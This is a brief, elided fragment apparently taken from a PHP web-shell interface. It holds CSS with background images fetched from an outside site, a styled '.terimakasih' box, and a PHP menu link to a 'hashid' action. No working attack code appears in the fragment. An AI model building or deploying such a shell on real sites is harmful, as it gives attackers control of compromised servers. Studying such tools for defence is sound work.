...
<style type="text/css">
html {
	 background: url(http://loscardos.ye.vc/files/1.jpg) no-repeat center center fixed; 
...
html {
	 background: url(http://loscardos.ye.vc/3.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
...
.terimakasih {
    ...
    border-radius :4px;
    width: 550px;
	  border: 2px solid #00ff00;box-shadow: 0px 0px 15px white;
    height: 100px;
}
...
echo "<a href='?dir=$dir&do=hashid'>Hashid</a>";
